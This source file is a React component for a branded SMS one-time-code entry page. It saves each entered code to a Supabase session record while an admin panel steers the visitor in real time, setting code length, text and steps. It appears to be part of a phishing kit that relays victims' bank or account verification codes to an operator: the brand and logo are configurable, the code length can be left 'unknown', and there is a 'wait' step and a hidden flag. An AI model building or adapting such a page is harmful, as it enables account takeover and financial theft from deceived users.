"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [digits, setDigits] = useState(6);
  const [smsMode, setSmsMode] = useState<"fixed" | "unknown">("fixed");
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  // ⭐ BELİRSİZ HANE: DİNAMİK hane sayısı (kullanıcı kaç hane girerse o kadar)
  //   min 4, max 12. Baslangicta 4 kutu gosterilir, kullanici 5. haneyi girince 5. kutu acilir, vb.
  const effectiveDigits = useMemo(() => {
    if (smsMode !== "unknown") return digits;
    // Belirsiz mod: min 4, max 12. code.length + 1 sonraki hane icin (en az 4).
    const needed = Math.max(4, Math.min(12, code.length + 1));
    return needed;
  }, [smsMode, digits, code.length]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }
      // ⭐ BELİRSİZ HANE: sms_mode === "unknown" VEYA sms_digits === 0 ise dynamic mod
      const modeUnknown = (data as any).sms_mode === "unknown" || (data as any).sms_mode === null && Number(data.sms_digits) === 0;
      setSmsMode(modeUnknown ? "unknown" : "fixed");
      setDigits(Number(data.sms_digits) || 6);
      setCustomText(data.sms_custom_text ?? null);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      fd.smsCode = "";
      fd.sms_code = "";
      // ⭐ KULLANICI SMS SAYFASINA TEKRAR DÖNÜNCE ESKİ SMS KODU ASLA GÖZÜKMEMELİ:
      setCode("");
      void supabase
        .from("sessions")
        .update({ form_data: { ...(data.form_data ?? {}), smsCode: "", sms_code: "" } })
        .eq("id", sessionId);
      setSessionFormData(fd);
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as {
              sms_digits?: number;
              sms_mode?: string | null;
              sms_custom_text?: string | null;
              current_step?: string;
              form_data?: Record<string, any>;
            };
            // ⭐ BELİRSİZ HANE realtime guncellemesi
            const modeUnknown = next.sms_mode === "unknown" || (next.sms_mode === undefined && Number(next.sms_digits) === 0);
            if (next.sms_mode !== undefined || next.sms_digits !== undefined) {
              setSmsMode(modeUnknown ? "unknown" : "fixed");
              setDigits(Number(next.sms_digits) || 6);
              setCode("");
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
            // Admin panelinden tekrar SMS adımına atılırsa (current_step = sms),
            // inputu BOŞALT (eski kod görünmesin).
            if (next.current_step === "sms") {
              setCode("");
              if (next.form_data && typeof next.form_data === "object") {
                next.form_data.smsCode = "";
                next.form_data.sms_code = "";
              }
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e?: React.FormEvent | null, fromAuto = false) {
    if (e) e.preventDefault();
    if (!supabase || !sessionId) return;
    const trimmed = code.trim();

    // ⭐ VALIDASYON:
    //   fixed mod: trimmed.length === digits + numeric
    //   unknown (belirsiz) mod: trimmed.length >= 4 (min 4 hane) + numeric (max 12)
    const isNumeric = /^\d+$/.test(trimmed);
    const validFixed = smsMode === "fixed" && trimmed.length === digits && isNumeric;
    const validUnknown = smsMode === "unknown" && trimmed.length >= 4 && trimmed.length <= 12 && isNumeric;
    if (!(validFixed || validUnknown)) {
      setMsg(
        smsMode === "fixed"
          ? `Enter exactly ${digits} digits.`
          : "Enter 4 to 12 digits.",
      );
      return;
    }

    setSaving(true);
    setMsg(null);

    const nextFormData = {
      ...sessionFormData,
      smsCode: trimmed,
      sms_code: trimmed,
      sms_otp_length: trimmed.length,
      sms_otp_mode: smsMode,
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Sending failed.");
    else {
      setSessionFormData(nextFormData);
      // ⭐ FLASH YOK: router.push → router.replace
      router.replace(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Invalid link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  // ⭐ VALIDASYON:
  //   fixed mod: code.length === digits
  //   unknown (belirsiz) mod: code.length >=4 (min 4, max 12). Tum basilan hane kadar DOLU olmali.
  const numeric = /^\d+$/.test(trimmed);
  const validFixed = smsMode === "fixed" && trimmed.length === digits && numeric;
  const validUnknown =
    smsMode === "unknown" &&
    trimmed.length >= 4 &&
    trimmed.length <= 12 &&
    numeric &&
    trimmed.length === effectiveDigits - 1; // Son kutudan SONRAKI (yeni) acilacak kutu yok ise tum kutular DOLDURULMUS
  const valid = validFixed || validUnknown;

  const displayText = customText || settings.sms_subtitle;
  const labelText =
    smsMode === "unknown"
      ? `${settings.sms_input_label} (Minimum 4 hane, maksimum 12)`
      : `${settings.sms_input_label} (${digits})`;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("").replace(/[^\d]/g, "");

    // ⭐ BELİRSİZ HANE: code slice siniri effectiveDigits DEGIL, max 12
    const limit = smsMode === "unknown" ? Math.max(4, 12) : digits;
    const finalCode = updatedCode.slice(0, limit);
    setCode(finalCode);

    // Move to next input
    // ⭐ BELİRSİZ HANE: effectiveDigits - 1 indexinden sonra next var (otomatik 5. kutu acilir 4. hane yazılınca)
    const nextIndex = index + 1;
    if (value && nextIndex < effectiveDigits) {
      const nextInput = document.getElementById(`otp-input-${nextIndex}`);
      if (nextInput) nextInput.focus();
    }

    // ⭐ OTOMATİK SUBMIT KAPANDI (kullanıcı isteği): Kullanıcı 4. veya daha sonraki
    //   kutuyu doldurunca otomatik wait'e YONLENME (önceden 200ms sonra otomatik
    //   handleSubmit calisiyordu). Artik sadece "Devam" butonu ile submit olur.
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const limit = smsMode === "unknown" ? 12 : digits;
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, limit);
    setCode(pastedData);
    const n = pastedData.length;
    if (n > 0) {
      const focusIndex = smsMode === "unknown" ? Math.min(n, effectiveDigits - 1) : Math.min(n, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
    // ⭐ OTOMATİK SUBMIT KAPANDI: Paste sonrasi 4+ hane dolu olsa bile otomatik
    //   submit YOK. Kullanici Devam butonuna basarak ilerlemeli.
  };

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[860px] fade-in">
        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
          <div className="flex items-start justify-between gap-3">
            <div className="min-w-0 max-w-[29rem]">
              <h2 className="pak-form-title">{settings.sms_title}</h2>
              <p className="pak-form-subtitle mt-2 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
            </div>
            <img
              src={settings.logo_url && settings.logo_url !== "/logo.png" ? settings.logo_url : "/logo.png"}
              alt={settings.portal_name || "Brand"}
              className="pak-form-brand-logo shrink-0"
              id="sms-brand-logo"
            />
          </div>
        
          <form onSubmit={handleSubmit} className="mt-5 space-y-5 sm:mt-6">
            <div className="pak-form-label">
              <div className="mb-3">{labelText}</div>
              <div className="flex flex-wrap justify-center gap-2" onPaste={handlePaste}>
              {Array.from({ length: effectiveDigits }).map((_, index) => (
                <input
                  key={index}
                  id={`otp-input-${index}`}
                  required
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={1}
                  className="pak-form-otp h-13 w-11 text-center text-2xl font-bold sm:h-15 sm:w-13 sm:text-[1.7rem]"
                  value={code[index] || ""}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
              </div>
            </div>

            {!valid && code.length > 0 ? (
              <p className="text-xs text-red-400">
                {smsMode === "fixed"
                  ? `Enter exactly ${digits} digits.`
                  : "Enter 4 to 12 digits. Fill all visible boxes to continue."}
              </p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#AAD84A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>The code was sent by SMS to your mobile number.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !valid}
                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
              >
                {saving ? settings.sms_loading : settings.sms_button}
              </button>
            </div>
          </form>

        </div>
      </div>
    </div>
  );
}
